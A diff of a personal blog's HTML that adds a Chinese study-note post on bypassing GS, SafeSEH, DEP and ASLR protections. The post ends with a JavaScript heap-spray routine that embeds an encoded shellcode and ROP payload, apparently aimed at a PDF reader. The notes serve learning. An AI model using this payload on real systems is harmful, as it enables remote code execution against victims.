@@ -19,18 +19,25 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta property="og:type" content="website">
-<meta property="og:title" content="oops-re&#39;blog">
-<meta property="og:url" content="http://example.com/archives/page/2/index.html">
+    <meta name="description" content="软件保护绕过GS保护cookie校验 通过在生成栈帧的时候先插入一个cookie     cookie通过ebp^data节的第一个字（dword） 在函数返回的时候校验cookie是否正确来保护栈，防止返回地址被溢出覆盖  绕过方法 攻击虚函数 通过成员变量修改虚表 来达到控制程序流程且不触发GS的效果   控制cookie 函数未启用cookie校验safeSEH保护safeSEH表 – 由编">
+<meta property="og:type" content="article">
+<meta property="og:title" content="简单复习--软件保护绕过">
+<meta property="og:url" content="http://example.com/2023/04/30/%E7%AE%80%E5%8D%95%E5%A4%8D%E4%B9%A0-%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87/index.html">
 <meta property="og:site_name" content="oops-re&#39;blog">
+<meta property="og:description" content="软件保护绕过GS保护cookie校验 通过在生成栈帧的时候先插入一个cookie     cookie通过ebp^data节的第一个字（dword） 在函数返回的时候校验cookie是否正确来保护栈，防止返回地址被溢出覆盖  绕过方法 攻击虚函数 通过成员变量修改虚表 来达到控制程序流程且不触发GS的效果   控制cookie 函数未启用cookie校验safeSEH保护safeSEH表 – 由编">
 <meta property="og:locale">
+<meta property="og:image" content="https://github.com/Oops-re/img/blob/main/SEH_CFG.png?raw=true">
+<meta property="article:published_time" content="2023-04-30T10:48:12.000Z">
+<meta property="article:modified_time" content="2023-04-30T10:49:16.811Z">
 <meta property="article:author" content="Oops-re">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/Oops-re/img/blob/main/SEH_CFG.png?raw=true">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/awke.ico">
     
-    <title>Oops-re&#39;s Blog</title>
+    <title>简单复习--软件保护绕过 · Oops-re&#39;s Blog</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -217,6 +224,8 @@
         }
     </script>
     
+        <body class="post-body">
+    
         <!-- header -->
         <header class="header header-mobile">
     <!-- top read progress line -->
@@ -246,6 +255,17 @@
     </div>
     <!-- toggle banner for post layout -->
     
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">Oops-re&#39;s Blog.</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">简单复习--软件保护绕过</a>
+            </div>
+        </div>
+    
 </header>
 
         <!-- fixed footer -->
@@ -272,24 +292,79 @@
 
 
 
+    height:50vh;
+
 ">
     
     <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(https://www.loliapi.com/acg/pc/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+                简单复习--软件保护绕过
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+                
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.3k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2023/04/30</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -419,311 +494,151 @@
 
             <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
             <div class="container container-unloaded">
-                <main class="main index-page">
-    
-        
-        
-        
-        
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2022/11/24/ROP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-                
-                <span class="abstract-title-text">ROP学习笔记</span>
-            </a>
-            <div class="abstract-content">
-                
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2022/11/25">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2022/11/24</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="Pwn">Pwn</a>
-    
-</div>
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="软件保护绕过"><a href="#软件保护绕过" class="headerlink" title="软件保护绕过"></a>软件保护绕过</h1><h2 id="GS保护"><a href="#GS保护" class="headerlink" title="GS保护"></a>GS保护</h2><p>cookie校验</p>
+<pre><code>通过在生成栈帧的时候先插入一个cookie
+    cookie通过ebp^data节的第一个字（dword）
+在函数返回的时候校验cookie是否正确来保护栈，防止返回地址被溢出覆盖
+</code></pre>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><ul>
+<li>攻击虚函数<ul>
+<li>通过成员变量修改虚表 来达到控制程序流程且不触发GS的效果</li>
+</ul>
+</li>
+<li>控制cookie</li>
+<li>函数未启用cookie校验<h2 id="safeSEH保护"><a href="#safeSEH保护" class="headerlink" title="safeSEH保护"></a>safeSEH保护</h2>safeSEH表 – 由编译器生成，保存异常函数地址</li>
+</ul>
+<p>检验规则<br>    <img src="https://github.com/Oops-re/img/blob/main/SEH_CFG.png?raw=true" alt="SEH_CFG"></p>
+<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>硬刚<br>可以知道 执行异常函数的情况如下：</p>
+<pre><code>1.跳转触发的异常函数地址位于本模块之外 且DEP关闭
+    通过堆溢出绕过，将shellcode布置为异常函数 之后且这样就达到了绕过
+2.safeSEH在本模块中未启用
+    可以通过清空safeSEH来达到这种效果
+</code></pre>
+<p>怂点<br>不去触发safeSEH </p>
+<pre><code>1.覆盖返回地址
+2.攻击虚函数
+</code></pre>
+<h2 id="DEP保护"><a href="#DEP保护" class="headerlink" title="DEP保护"></a>DEP保护</h2><p>数据执行保护</p>
+<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><pre><code>将数据所在的内存页标识为不可执行，
+当程序执行到有这个标识的内存页时，CPU抛出异常，退出程序
+</code></pre>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><pre><code>可以通过函数virtualprotect进行修改DEP
+    BOOL VirtualProtect(
+        LPVOID lpaddress,
+        DWORD dwSize,
+        DWORD flNewProtect,
+        PDWORD lpflOldProtect
+    );
+    设置flNewProtect参数为PAGE_EXECUTE_READWRITE(0x40) 可读可写可执行
+或者
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
-            
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2022/11/24/hello-world/">
-                
-                <span class="abstract-title-text">Hello World</span>
-            </a>
-            <div class="abstract-content">
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2021/10/23">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2022/11/24</span>
-                </div>
-                <!-- tags -->
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2021/12/20/PE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-                
-                <span class="abstract-title-text">PE学习笔记</span>
-            </a>
-            <div class="abstract-content">
-                1PE 视频学习1.认识PE首先，先介绍什么是**可执行文件(executable file)**：可以由操作系统进行加载执行的文件
-而 PE（Portable Executable） 就是windows操作系统的可执行文件结构，一种可移植的可执行文件，即可在任何windows平台上运行
-另外 ELF（Executable and Linking Format）是Linux系统的可执行文件结构
+构造ret2text 执行自己代码节的命令
 
-1.1PE文件格式的运用
-病毒与反病毒
-外挂与反外挂
-加壳与脱壳
-无源码修改功能、软件汉化。。。等
+还有就是通过virtualAlloc函数，可以创建一个数据可执行的内存块
+    来存放shellcode
+    WINAPI VirtualAlloc(
+        LPVOID lpaddress,
+        SIZE_T dwSize,
+        DOWRD flAllocationType,
+        DOWRD flProtect);
+</code></pre>
+<h2 id="ALSR保护"><a href="#ALSR保护" class="headerlink" title="ALSR保护"></a>ALSR保护</h2><p>地址随机化保护</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>作用位置</th>
+<th>归属</th>
+<th>作用时间</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ASLR</td>
+<td>栈基地址（stack）、共享库（.solibraries）、mmap 基地址、随机化堆基地址（chunk）</td>
+<td>系统功能</td>
+<td>作用于程序（ELF）装入内存运行时</td>
+</tr>
+<tr>
+<td>PIE</td>
+<td>代码段（ .text ）、初始化数据段（ .data ）、未初始化数据段（ .bss ）</td>
+<td>编译器功能</td>
+<td>作用于程序（ELF）编译过程中</td>
+</tr>
+</tbody></table>
+<h3 id="绕过手段"><a href="#绕过手段" class="headerlink" title="绕过手段"></a>绕过手段</h3><p>1.相对寻址</p>
+<pre><code>在linux中 常用的方法就是通过elf.got[&quot;puts&quot;]泄露模块中puts函数的地址puts_addr，
+再在文件中 计算想要地址和puts的偏移
+    offset = libc.symbols[&quot;puts&quot;]-libc.symbols[&quot;system&quot;]
+且 我们在文件中可以通过查找，找到某个某个函数在这个模块的偏移addr
+最后得到这个函数在内存中的地址
+    func_addr = puts_addr-offset
+</code></pre>
+<p>2.Heap Spray定位(堆喷)<br>    通过构造多个由 nop指令 + shellcode 1MB 大小的内存片 覆盖 0x0c0c0c0c的堆内存<br>    这样<br>    我们就可以通过ret 到 内存指针的方式 跳到shellcode中</p>
+<p>如下就是通过javascript实现的堆喷<br>这段堆喷代码会在堆中的以0xc0c地址结尾的地方存放shellcode，<br>如 0x0C0A0C0C、0x0C0B0C0C、0x0C0C0C0C 处的代码完全一样。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>( <span class="string">&#x27;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%uddda%u86ba%u6045%ud993%u2474%u58f4%uc929%u59b1%uc083%u3104%u1550%u5003%u6415%u9cb0%ue77b%u5d3b%u977c%ub8b2%u854d%uc9a1%u19fc%u9ca1%ud20c%u34e7%u1b3c%u478c%uec16%ued24%uc340%u5e8a%u42b0%u9d77%ua4e5%u6e46%ua5f8%u388f%u4a76%u305d%u842a%ucd35%u9889%u01b8%ua086%u24c2%u5459%u267f%uc48a%u60f4%u6f32%u5152%ubc43%u58e6%u7e37%ud1a0%uf58c%u3033%uf6dd%u7c05%uc9b2%u71a9%u0eca%u6a0d%u64b9%u176d%ubfba%uc30f%u5f4f%u80b7%ubbe8%u4449%u486e%u2145%u16e4%ub44a%u2d29%u3d76%ue1cc%u05fe%u25eb%udd5a%u7c92%ub006%u9eab%u6dee%ud50e%u7b1d%u162e%u84de%u8072%u4912%u508d%uda3d%u62fe%u70e2%uce69%u5f6b%u476e%u607b%uefa0%u9eec%u0f41%u6524%u5f15%u4c5e%u3416%u719e%ua0c3%ue594%u9c2c%u7a6f%udec4%ua76f%u57ad%uf789%u379d%ub806%uf74d%u50f6%uf884%u4029%ud3a7%ueb41%u8d48%u843a%u94f1%u35b1%u03fd%u76bc%ua175%u3840%uc07e%u2d52%u2a19%uaeab%u2a8c%uaac1%u7d06%ub17d%u497f%u4a22%ucaaa%ub425%ufa2b%u835e%u42b9%uec09%u422d%ubac9%u4227%u1aa1%u111c%u64d4%u0689%uf145%u7e32%u5239%u7c5b%u9464%u7fc4%ua643%u7f03%u8111%u17ab%u91e9%ue74b%u1183%u8f1c%u3d58%u7f93%u94a0%u17fc%u792b%u864e%u502c%u160e%u572c%ua98b%u1857%u4a2c%u30a8%u4b49%u3ca8%u706f%u057e%ub705%u3242%u8216%u13e7%uecbd%u64b4%u4194&#x27;</span> );</span><br><span class="line"><span class="keyword">var</span> nop = <span class="built_in">unescape</span>( <span class="string">&quot;%&quot;</span> + <span class="string">&quot;u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里开始构造内存片</span></span><br><span class="line"><span class="keyword">while</span> (nop.<span class="property">length</span> + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) nop+=nop;</span><br><span class="line"><span class="comment">//堆的开头存放0x20大小的头部信息 </span></span><br><span class="line"><span class="comment">//0x4是‘aaaa’ </span></span><br><span class="line"><span class="comment">//除以二是因为javascript中字符串是unicode形式存放（一字符两字节）</span></span><br><span class="line">d = nop.<span class="title function_">substring</span>(<span class="number">0</span>, (<span class="number">0x0c0c</span>-<span class="number">0x20</span>-<span class="number">0x4</span>)/<span class="number">2</span>);</span><br><span class="line">d += shellcode;<span class="comment">//在0x...c0c位置插入shellcode</span></span><br><span class="line">d += nop;						  	</span><br><span class="line">e = d.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);<span class="comment">//截取 滑块代码+shellcode+滑块代码 1mb</span></span><br><span class="line"><span class="keyword">while</span>(e.<span class="property">length</span> &lt; <span class="number">0x80000</span>) e += e;	<span class="comment">//将1mb大小的代码片填入 即 每隔0x10000 就有一段shellcode</span></span><br><span class="line">h = e.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span>-<span class="number">0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> slide = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">0x1f0</span>;i++) slide[i]=h+<span class="string">&quot;s&quot;</span>;</span><br><span class="line"><span class="comment">//使用0x1f0 * 0x10000 大小的内存 大概500M 所以在打开这个pdf的时候会卡顿</span></span><br></pre></td></tr></table></figure>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://example.com">Oops-re</a>
+            <p>原文链接：<a href="http://example.com/2023/04/30/%E7%AE%80%E5%8D%95%E5%A4%8D%E4%B9%A0-%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87/">http://example.com/2023/04/30/%E7%AE%80%E5%8D%95%E5%A4%8D%E4%B9%A0-%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87/</a>
+            <p>发表日期：<a href="http://example.com/2023/04/30/%E7%AE%80%E5%8D%95%E5%A4%8D%E4%B9%A0-%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87/">April 30th 2023, 6:48:12 pm</a>
+            <p>更新日期：<a href="http://example.com/2023/04/30/%E7%AE%80%E5%8D%95%E5%A4%8D%E4%B9%A0-%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87/">April 30th 2023, 6:49:16 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2023/04/30/%E7%AE%80%E5%8D%95%E5%A4%8D%E4%B9%A0-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/" title="简单复习--二进制漏洞">
+                    <div class="nextTitle">简单复习--二进制漏洞</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2023/04/23/UPX%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/" title="UPX逆向分析">
+                    <div class="prevTitle">UPX逆向分析</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
 
 
-1.2如何识别PE文件1.2.1 文件后缀名​    一般的来说，DLL，EXE，OCX，...
-            </div>
-            <!-- read more -->
             
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2022/11/25">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/12/20</span>
-                </div>
-                <!-- tags -->
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2021/11/27/OD%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-                
-                <span class="abstract-title-text">OD学习笔记</span>
-            </a>
-            <div class="abstract-content">
-                OD的使用学习笔记学逆向必备工具，但是，由于之前知识储备不足，使用的时候总是看不懂，但这个假期又学了新知识，再来尝试尝试这个工具。
-这篇文章可能大致会分会两个部分，一部分为使用OD要用的汇编知识，一部分就是使用OD来分析一个个程序。
-需要在意的是OD只能分析32位的程序。
-汇编知识1.标志位
-在逆向中，需要在意的标志位只有3个，即cmp指令能修改的那三个：Z/O/C
-1234首先要知道cmp指令的作用：    cmp ax,bx	    cmp---比较语句，相当于执行减法，但结果不对ax,bx造成影响,但会对标志寄存器中的值造成影响，    		  从而实现JCC跳转
 
-123456Z...
-            </div>
-            <!-- read more -->
             
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2022/11/25">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/11/27</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="Re">Re</a>
-    
-</div>
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
             
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2021/11/23/JavaScript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-                
-                <span class="abstract-title-text">JavaScript学习笔记</span>
-            </a>
-            <div class="abstract-content">
-                <h1 id="JavaScript基础语法学习笔记"><a href="#JavaScript基础语法学习笔记" class="headerlink" title="JavaScript基础语法学习笔记"></a>JavaScript基础语法学习笔记</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>JavaScript 是互联网上最流行的脚本语言，这门语言可用于 HTML 和 web，更可广泛用于服务器、PC、笔记本电脑、平板电脑和智能手机等设备。</p>
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2022/11/25">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/11/23</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="JavaScript">JavaScript</a>
-    
-</div>
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
-            
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2021/11/18/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-                
-                <span class="abstract-title-text">HTML学习笔记</span>
-            </a>
-            <div class="abstract-content">
-                <h1 id="HTML-基本语法-学习笔记"><a href="#HTML-基本语法-学习笔记" class="headerlink" title="HTML 基本语法 学习笔记"></a>HTML 基本语法 学习笔记</h1>
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2022/11/25">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/11/18</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="HTML">HTML</a>
-    
-</div>
+            <!-- utteranc评论 -->
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2021/11/17/markdown/">
-                
-                <span class="abstract-title-text">markdown</span>
-            </a>
-            <div class="abstract-content">
-                markdown语法学习1.标题语法：123456789//&quot;#&quot;一个＃字键叫一个空格分开，输入内容，该内容将被加粗加大到最大//“##”二级变大//“###”三级变大//通常用作目录/*# 加粗加大到最大 一级标题## 加粗加大到第二大 二级标题### 加粗加大到第三大 三级标题*/
 
-示例：
-标题标题标题标题2.字体：123456789//加粗**加粗内容**//代码高亮==int main==//删除线~~删除内容~~//斜体*斜体内容*
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
 
-加粗内容
-==高亮==
-删除内容斜体内容
-3.引用1234//引用语法：&gt;名字：&gt;&gt;年龄：&gt;&gt...
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2022/11/25">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/11/17</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="语法">语法</a>
-    
-</div>
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
             
             
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2021/11/11/blog/">
-                
-                <span class="abstract-title-text">blog</span>
-            </a>
-            <div class="abstract-content">
-                <meta name="referrer" content="no-referrer">
 
-<h1 id="搭建一个属于自己的博客"><a href="#搭建一个属于自己的博客" class="headerlink" title="搭建一个属于自己的博客"></a>搭建一个属于自己的博客</h1><p>（基于github和hexo搭建）</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html#%E9%85%8D%E7%BD%AEssh-key">https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html#%E9%85%8D%E7%BD%AEssh-key</a></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">必备：</span><br><span class="line">    github账号</span><br><span class="line">    node.js</span><br><span class="line">    git <span class="keyword">for</span> windows</span><br></pre></td></tr></table></figure>
-            </div>
-            <!-- read more -->
             
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2021/11/11">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/11/11</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="blog">blog</a>
-    
-</div>
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
+        </div>
     
-    <!-- paginator  -->
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
     
-        <nav class="page-nav">
-            <a class="extend prev" rel="prev" href="/archives/">&lt; PREV</a><a class="page-number" href="/archives/">1</a><span class="page-number current">2</span>
-        </nav>
+    <!-- Mathjax -->
     
 </main>
 
@@ -821,6 +736,23 @@
 
         </div>
         <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">软件保护绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GS%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.</span> <span class="toc-text">GS保护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.1.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#safeSEH%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.2.</span> <span class="toc-text">safeSEH保护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DEP%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.3.</span> <span class="toc-text">DEP保护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.1.</span> <span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.2.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ALSR%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.4.</span> <span class="toc-text">ALSR保护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5"><span class="toc-number">1.4.1.</span> <span class="toc-text">绕过手段</span></a></li></ol></li></ol></li></ol>
+            </div>
         
         <!-- sidebar -->
